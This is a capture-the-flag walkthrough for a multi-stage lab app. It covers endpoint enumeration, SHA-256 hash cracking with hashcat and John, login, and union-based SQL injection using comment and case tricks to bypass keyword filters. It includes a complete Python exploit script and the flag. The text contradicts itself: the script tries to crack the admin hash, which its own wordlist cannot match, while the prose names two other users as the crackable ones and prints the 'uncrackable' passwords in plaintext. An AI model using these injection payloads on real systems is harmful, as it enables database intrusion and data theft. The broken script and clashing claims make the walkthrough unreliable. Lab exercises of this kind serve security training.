# 🎯 Multi-Stage SQL Injection Challenge

## 🚀 **Challenge Overview**

**Stage 1:** Information Gathering & Password Cracking  
**Stage 2:** Authentication  
**Stage 3:** SQL Injection Exploitation  

**Final Goal:** Extract the flag from the hidden database table

---

## 📋 **Stage 1: Information Gathering & Hash Cracking**

### Step 1.1: Discover the Hidden Endpoint
Players need to find the exposed `/getusers` endpoint through:

```bash
# Directory enumeration
/users
/getusers  ← TARGET
/api/users
/admin/users
/debug/users
```

### Step 1.2: Access User Data
```bash
GET /getusers
```

**Response Example:**
```json
{
  "message": "Employee database export",
  "total_users": 7,
  "users": [
    {
      "id": 1,
      "username": "nishanth",
      "password_hash": "[VERY_HARD_TO_CRACK_HASH]",
      "role": "user",
      "email": "nishanth@company.com"
    },
    {
      "id": 3,
      "username": "rohith",
      "password_hash": "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f", 
      "role": "user",
      "email": "rohith@company.com"
    },
    {
      "id": 4,
      "username": "mative",
      "password_hash": "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",
      "role": "moderator", 
      "email": "mative@company.com"
    },
    {
      "id": 5,
      "username": "admin_user",
      "password_hash": "[VERY_HARD_TO_CRACK_HASH]", 
      "role": "admin",
      "email": "admin@company.com"
    }
  ]
}
```

### Step 1.3: Crack Password Hashes
**Strategy:** Only 2 users have easily crackable passwords!

**CRACKABLE Passwords (CTF targets):**
```bash
# rohith - password123  ← EASY TARGET
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f

# mative - admin123  ← EASY TARGET (has moderator role)
240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9
```

**VERY HARD Passwords (designed to waste time):**
```bash
# nishanth - N1sh@nTh#2024$Secure!K3y (Complex password - nearly impossible to crack)
# abu - Ab@u$tr0ng#P@ssw0rd2024! (Complex password - nearly impossible to crack)  
# admin_user - Adm1n#Sup3r$3cur3!P@ss2024 (Complex password - nearly impossible to crack)
# divesh - D1v3sh#C0mplex$P@ssw0rd!2024 (Complex password - nearly impossible to crack)
# saiteja - S@iT3j@#Str0ng$K3y!2024 (Complex password - nearly impossible to crack)
```

**Cracking Strategy:**
The challenge is designed so that only 2 users have crackable passwords. Players should focus their efforts on these targets rather than wasting time on the extremely complex passwords.

**Cracking Methods:**
```bash
# Using hashcat (focus on the 2 crackable hashes only)
hashcat -m 1400 easy_hashes.txt rockyou.txt

# Using John the Ripper  
john --format=Raw-SHA256 easy_hashes.txt

# Online tools
# CrackStation, MD5Hashing.net, etc.

# Manual/Dictionary attack
# Focus on: password123, admin123
```

---

## 🔐 **Stage 2: Authentication**

### Step 2.1: Attempt Login
After cracking hashes, players login with valid credentials:

```bash
# ONLY CRACKABLE USERS (focus on these):
Username: rohith
Password: password123

Username: mative  
Password: admin123

# NOTE: Other users have extremely complex passwords that are 
# intentionally difficult to crack to focus player effort
```

### Step 2.2: Verify Access
- Login should succeed and redirect to dashboard
- Access to `/search` endpoint is now available
- Session cookie is set for authentication

**Important:** Login is now **secure** - no wildcard bypass possible!

---

## 💉 **Stage 3: SQL Injection Exploitation**

### Step 3.1: Access Search Functionality
Only after successful authentication can players access `/search`

### Step 3.2: Test for SQL Injection
```sql
# Basic wildcard test
%

# Test filtering
' UNION SELECT 1,2,3,4--
# Result: "Invalid search query. Please use appropriate search terms."
```

### Step 3.3: Bypass Keyword Filtering
```sql
# Comment-based bypass (WORKING METHOD)
%' /**/UNION/**/SELECT/**/1,2,3,4--

# Alternative bypasses
%' UnIoN sElEcT 1,2,3,4--
%' UNION	SELECT 1,2,3,4--
```

### Step 3.4: Database Enumeration
```sql
# Discover tables
%' /**/UNION/**/SELECT/**/name,type,sql,''/**/FROM/**/sqlite_master/**/WHERE/**/type='table'--

# Get schemas  
%' /**/UNION/**/SELECT/**/sql,'','',''/**/FROM/**/sqlite_master/**/WHERE/**/name='admin_secrets'--
```

### Step 3.5: Extract the Flag
```sql
# Final payload
%' /**/UNION/**/SELECT/**/flag,secret_key,description,''/**/FROM/**/admin_secrets--
```

**Flag:** `H7CTF{W1LD_C4RD5_4R3_D4NG3R0U5_1N_5QL_1NJ3CT10N}`

---

## 🛠️ **Complete Exploitation Script**

```python
import requests
import hashlib
import json

BASE_URL = "http://localhost:3000"

# Stage 1: Get user data and crack hashes
def get_user_data():
    response = requests.get(f"{BASE_URL}/getusers")
    if response.status_code == 200:
        return response.json()
    return None

def crack_hash(hash_value, wordlist=['password123', 'qwerty789', 'snoopy456', 'amazon999', 'admin2024', 'developer']):
    for password in wordlist:
        if hashlib.sha256(password.encode()).hexdigest() == hash_value:
            return password
    return None

# Stage 2: Login with cracked credentials  
def login(username, password):
    session = requests.Session()
    response = session.post(f"{BASE_URL}/login", data={
        'username': username,
        'password': password
    })
    if "Welcome" in response.text:
        return session
    return None

# Stage 3: SQL Injection
def sql_injection(session):
    payload = "%' /**/UNION/**/SELECT/**/flag,secret_key,description,''/**/FROM/**/admin_secrets--"
    response = session.post(f"{BASE_URL}/search", data={'query': payload})
    
    if "H7CTF{" in response.text:
        import re
        flag = re.search(r'H7CTF\{[^}]+\}', response.text)
        return flag.group() if flag else None
    return None

# Main execution
def main():
    print("[+] Stage 1: Getting user data...")
    user_data = get_user_data()
    if not user_data:
        print("[-] Failed to get user data")
        return
    
    print("[+] Stage 2: Cracking password hashes...")
    admin_user = None
    for user in user_data['users']:
        if user['role'] == 'admin':
            password = crack_hash(user['password_hash'])
            if password:
                admin_user = (user['username'], password)
                print(f"[+] Cracked admin password: {user['username']}:{password}")
                break
    
    if not admin_user:
        print("[-] Failed to crack admin password")
        return
    
    print("[+] Stage 3: Logging in...")
    session = login(admin_user[0], admin_user[1])
    if not session:
        print("[-] Login failed")
        return
    
    print("[+] Stage 4: SQL Injection...")
    flag = sql_injection(session)
    if flag:
        print(f"[+] FLAG FOUND: {flag}")
    else:
        print("[-] SQL injection failed")

if __name__ == "__main__":
    main()
```

---

## 🎯 **Challenge Difficulty Progression**

### **Beginner → Intermediate → Advanced**

1. **Information Gathering** (Beginner)
   - Directory enumeration
   - API endpoint discovery

2. **Cryptography** (Intermediate)  
   - Hash identification (SHA256)
   - Password cracking techniques
   - Dictionary attacks

3. **Authentication** (Intermediate)
   - Session management understanding
   - Secure login (no bypass possible)

4. **SQL Injection** (Advanced)
   - Filter bypass techniques
   - Database enumeration
   - Union-based data extraction

---

## 🏆 **Learning Outcomes**

Players will learn:
- **OSINT & Enumeration** techniques
- **Hash cracking** methodologies  
- **Authentication** mechanisms
- **Advanced SQL injection** with filters
- **Multi-stage attack** planning
- **Real-world penetration testing** workflow

This creates a **much more realistic** and **educationally valuable** challenge! 🎯